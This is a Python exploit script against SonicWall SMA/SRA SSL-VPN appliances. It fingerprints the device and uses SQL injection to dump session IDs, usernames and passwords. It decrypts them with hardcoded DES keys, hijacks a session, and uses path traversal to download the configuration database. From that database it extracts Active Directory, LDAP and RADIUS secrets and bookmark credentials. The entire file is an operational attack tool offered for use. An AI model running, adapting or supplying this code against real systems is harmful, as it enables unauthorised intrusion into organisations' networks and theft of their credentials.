import requests
import sys
import urllib3
from base64 import b64decode, b64encode
import json
import sqlite3
from os import makedirs
import crypto
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
}

proxies = {
}
import colorama
from colorama import Fore
colorama.init()


def decrypt_password(password):
    key = '2F4F2A86D552F880'
    password = bytes.fromhex(password)
    # ICA Citrix KEY: 98EF79BF23F2263E2046FB8EFC7F0000
    return crypto.DES.new(bytes.fromhex(key), crypto.DES.MODE_CBC, bytes.fromhex('0000000000000000')).decrypt(
        password).decode().replace('\x00', '')


def decrypt_cfg_password(password):
    key = '58D31CBAFBAD2952'
    password = bytes.fromhex(password)
    # ICA Citrix KEY: 98EF79BF23F2263E2046FB8EFC7F0000
    return crypto.DES.new(bytes.fromhex(key), crypto.DES.MODE_CBC, bytes.fromhex('0000000000000000')).decrypt(
        password).decode().replace('\x00', '')


def save_data(path, name, data):
    fd = open(path + '/' + name + '.json', 'w+')
    fd.write(json.dumps(data, indent = 4, sort_keys=True))
    fd.close()


def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d


def json_decode(string):
    try:
        return json.loads(string)
    except Exception:
        return None


class SRASploits():
    def __init__(self, url):
        self.url = url
        self.ver = None  # 0 < 9.x/10.x, 1 > 9.x/10.x
        self.hasCX = None  # Citrix sub check...
        self.Cookies = None
        self.email = None

    def Verify(self):
        print('[i] Checking URL {}'.format(self.url))
        try:
            tr = requests.get(self.url + '/spog/welcome',
                              verify=False, allow_redirects=False, headers=headers, proxies=proxies, timeout=10)
        except:
            print(Fore.RED +'[-] Bad (Timeout): ' + self.url + Fore.RESET)
            exit(0)
        if tr.status_code == 200:
            if 'Set-Cookie' in tr.headers.keys():
                self.Cookies = tr.cookies
                tr = requests.get(self.url + '/spog/welcome',
                                  verify=False, cookies=self.Cookies, headers=headers, proxies=proxies, timeout=10)

            if (tr.text.find('SMA') != -1 and tr.text.find('SonicWall') != -1):
                self.ver = 1
        else:
            tr = requests.get(self.url + '/cgi-bin/welcome',
                              verify=False, allow_redirects=False, headers=headers, proxies=proxies, timeout=10)
            if tr.status_code == 200 and tr.text.find('/cgi-bin/userLogin') != -1:
                self.ver = 0
        if self.ver is None:
            print(Fore.RED +'[-] Bad: ' + self.url+Fore.RESET)
            exit(0)
        print(Fore.YELLOW+'[i] Version ok: ' + self.url+Fore.RESET)
        with open("versions.txt", 'a') as fw:
            fw.write(self.url.split('//')[1] + '\n')
        if self.Cookies is not None:
            tr = requests.get(self.url + '/cgi-bin/welcome',
                              verify=False, cookies=self.Cookies, allow_redirects=False, headers=headers,
                              proxies=proxies)
        else:
            tr = requests.get(self.url + '/cgi-bin/welcome',
                              verify=False, allow_redirects=False, headers=headers, proxies=proxies)
        if tr.status_code != 200:
            return False
        if tr.text.find('/swl_login.') == -1:
            return True

        ver = tr.text[
              tr.text.find('/swl_login.') + len('/swl_login.'):tr.text.find('.css\'', tr.text.find('/swl_login.'))]
        if len(ver) < 2:
            return False
        return True

    def find_val(self, val, html):
        idx0 = html.find(val)
        idx1 = html.find('";', idx0)
        if idx0 == -1 or idx1 == -1:
            return 'NOVAL'
        else:
            return html[idx0 + len(val):idx1]

    def DumpSessionsNew(self):
        ret = []
        sqliu = self.url + '/cgi-bin/extendauthentication'
        try:
            sqline = "' UNION SELECT userType||'#'||sessionid||'#'||userName||'#'||password||'#'||domainName from Sessions LIMIT {},1;"
            idx = 0
            while (idx != -1):
                data = {'action': 'query', 'extendid': sqline.format(str(idx))}
                if self.Cookies is not None:
                    print(Fore.YELLOW + '[i] Cookies: ' + self.Cookies + ' | ' + self.url + Fore.RESET)
                    resp = requests.post(
                        sqliu, data=data, timeout=50, verify=False, cookies=self.Cookies, headers=headers,
                        proxies=proxies)
                else:
                    resp = requests.post(
                        sqliu, data=data, timeout=50, verify=False, headers=headers, proxies=proxies)
                if resp.status_code == 500:
                    if idx == 0:
                        return []
                    idx = -1
                elif resp.status_code == 403:
                    return ret

                respj = json_decode(resp.text)
                if respj is None:
                    return []

                if 'extend_id' in respj.keys() and respj['extend_id'] == 'failed':
                    if idx == 0:
                        return []
                    idx = -1
                    continue

                if respj['response'] != 'OK':
                    return ret
                if 'Set-Cookie' not in resp.headers.keys():
                    return ret
                user_type, sess_id, user_name, password, domainName = b64decode(
                    resp.headers['Set-Cookie'].split(';')[0].replace('swap=', '').encode()).decode().split('#')
                ret.append('{} {} {} {} {}'.format(sess_id, user_type,
                                                   user_name, decrypt_password(password), domainName))
                idx += 1
            return ret

        except Exception as ex:
            return ret

    def DumpSessionsOld(self):
        ret = []
        sqliu = self.url + '/cgi-bin/supportInstaller'
        try:
            sqline = "' UNION SELECT 1,2,userType||'#'||domainName,sessionid,userName,password,7,8 from Sessions LIMIT {},1 --"
            idx = 0
            while (idx != -1):
                data = {'fromEmailInvite': 'true',
                        'customerTID': sqline.format(str(idx))}
                if self.Cookies is not None:
                    print(Fore.YELLOW + '[i] Cookies: ' + self.Cookies + ' | ' + self.url + Fore.RESET)
                    resp = requests.post(
                        sqliu, data=data, timeout=50, verify=False, cookies=self.Cookies, headers=headers,
                        proxies=proxies)
                else:
                    resp = requests.post(
                        sqliu, data=data, timeout=50, verify=False, headers=headers, proxies=proxies)
                if resp.status_code == 500:
                    if idx == 0:
                        return []
                    idx = -1
                    continue
                elif resp.status_code == 403:
                    return ret
                else:
                    html = resp.text
                    sess_id = self.find_val('var username      = "', html)
                    user_type, domainName = self.find_val(
                        'var portalname    = "', html).split('#')
                    user_name = self.find_val('var expertname    = "', html)
                    password = self.find_val('var supportcode   = "', html)

                    if sess_id == 'NOVAL' and user_type == 'NOVAL' and user_name == 'NOVAL' and password == 'NOVAL':
                        idx = -1
                        continue
                    ret.append('{} {} {} {} {}'.format(
                        sess_id, user_type, user_name, decrypt_password(password), domainName))
                    idx += 1
            return ret

        except Exception as ex:
            return ret

    def LeakConfig(self):
        print('[i] Parsing sessions from {}'.format(self.url))
        if self.ver == 0:
            sessions = ex.DumpSessionsOld()
        else:
            sessions = ex.DumpSessionsNew()
        if len(sessions) < 1:
            print(Fore.RED+'[-]' + self.url + ': No sessions found.'+Fore.YELLOW)
            return False
        else:
            print(Fore.GREEN+ '[+] '+self.url+ ': Found ' + str(len(sessions)) + ' sessions' + Fore.RESET)
        cfpath = "./Dumps/{}".format(self.url.split('/')[2].replace(':', '_'))

        try:
            makedirs(cfpath)
        except:
            pass

        save_data(cfpath, 'sessions', sessions)

        idx = 0
        for sess in sessions:
            sess_id = sess.split(' ')[0]
            if self.Cookies is None:
                self.Cookies = {'swap': b64encode(sess_id.encode()).decode()}
            if 'swap' in self.Cookies.keys():
                self.Cookies['swap'] = b64encode(sess_id.encode()).decode()
            else:
                self.Cookies.update(
                    {'swap': b64encode(sess_id.encode()).decode()})

            leakd = {
                'scriptdownload': '../../../../../../usr/src/EasyAccess/var/conf/persist.db', 'epcversionquery': '0'}
            dumpr = requests.post(
                self.url + '/cgi-bin/sslvpnclient', verify=False, cookies=self.Cookies, data=leakd, headers=headers,
                proxies=proxies)
            if dumpr.status_code != 200:
                idx += 1
                continue

            if dumpr.text.find('is not licensed') != -1:
                return False

            # Maybe access the sqlite db and show important config data here?

            cfg_len = dumpr.headers.get('content-length')
            if cfg_len is None:
                idx += 1
                continue
            else:
                fname = cfpath + '/config.sqlite'
                dl = 0
                cfg_len = int(cfg_len)
                fd = open(fname, 'wb+')
                for data in dumpr.iter_content(chunk_size=4096):
                    dl += len(data)
                    fd.write(data)
                    done = int(50 * dl / cfg_len)
                    sys.stdout.write("\r[%s%s]" % ('=' * done, ' ' * (50 - done)))
                    sys.stdout.flush()
                fd.close()
                self.parse_cfs(cfpath, '/config.sqlite')
                return True

    def TryEmail(self):
        if self.email is None:
            return False
        if self.Cookies is None:
            emr = requests.get(self.url + '/cgi-bin/exportConfigFile?emailCurrentConfig+' + self.email, verify=False,
                               headers=headers, proxies=proxies)
        else:
            emr = requests.get(self.url + '/cgi-bin/exportConfigFile?emailCurrentConfig+' + self.email, verify=False,
                               cookies=self.Cookies, headers=headers, proxies=proxies)

        if emr.status_code != 500:
            return False
        return True

    def parse_cfs(self, path, dbname):
        services = {'103': 'RDP', '101': 'VNC', '12': 'CITRIX', '8': 'CIFS_SMB', '1': 'FTP', '25': 'SSH',
                    '102': 'TELNET', '100': 'SSH'}
        connection = sqlite3.connect(path + dbname)
        connection.row_factory = dict_factory

        cursor = connection.cursor()

        cursor.execute("SELECT userName,passwd,securepasswd,userType FROM Users;")
        users = cursor.fetchall()
        save_data(path, 'users', users)

        cursor.execute("SELECT * from domains_AD;")
        AD_data = cursor.fetchall()
        if len(AD_data) > 0:
            AD_Creds = []
            for ad in AD_data:
                if ad['password'] is not None and len(ad['password']) > 1:
                    ad['password'] = decrypt_password(ad['password'])
                AD_Creds.append(ad)
            save_data(path, 'AD_creds', AD_Creds)

        cursor.execute("SELECT * from domains_LDAP;")
        LDAP_data = cursor.fetchall()
        if len(LDAP_data) > 0:
            ldap_creds = []
            for ld in LDAP_data:
                if len(ld['password']) > 0:
                    ld['password'] = decrypt_password(ld['password'])
                ldap_creds.append(ld)
            save_data(path, 'LDAP_creds', ldap_creds)

        cursor.execute("SELECT * from domains_RADIUS;")
        RADIUS_data = cursor.fetchall()
        if len(RADIUS_data) > 0:
            rad_data = []
            for rad in RADIUS_data:
                if len(rad['secret']) > 0:
                    rad['secret'] = decrypt_password(rad['secret'])
                if len(rad['backupSecret']) > 0:
                    rad['backupSecret'] = decrypt_password(rad['backupSecret'])
                rad_data.append(rad)
            save_data(path, 'RADIUS_creds', rad_data)

        cursor.execute("SELECT * from Bookmarks;")
        BMK_data = cursor.fetchall()
        if len(BMK_data) > 0:
            Bookmarks = []
            for bookmark in BMK_data:
                if len(bookmark['ssoPass']) > 0:
                    bookmark['ssoPass'] = decrypt_cfg_password(bookmark['ssoPass'])
                    bookmark['servType'] = str(bookmark['servType'])
                    if bookmark['servType'] in services.keys():
                        bmk = {'name': bookmark['name'], 'username': bookmark['ssoName'],
                               'password': bookmark['ssoPass'], 'service': services[bookmark['servType']],
                               'host': bookmark['hostID']}
                    else:
                        bmk = {'name': bookmark['name'], 'username': bookmark['ssoName'],
                               'password': bookmark['ssoPass'], 'service': 'UNK_SERVICE', 'host': bookmark['hostID']}
                else:
                    if bookmark['servType'] in services.keys():
                        bmk = {'name': bookmark['name'], 'username': bookmark['ssoName'],
                               'password': bookmark['ssoPass'], 'service': services[bookmark['servType']],
                               'host': bookmark['hostID']}
                    else:
                        bmk = {'userGroupID': bookmark['userGroupControlId'], 'name': bookmark['name'],
                               'username': bookmark['ssoName'], 'password': bookmark['ssoPass'],
                               'service': 'UNK_SERVICE', 'host': bookmark['hostID']}

                Bookmarks.append(bmk)
            save_data(path, 'Bookmarks', Bookmarks)


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('[-] Usage: {} URL [proxy]'.format(sys.argv[0]))
        sys.exit(-1)

    if len(sys.argv) > 2:
        proxies['https'] = sys.argv[2]

    url = sys.argv[1]
    ex = SRASploits(url.strip())
    if ex.Verify() == False:
        sys.exit(0)

    ex.LeakConfig()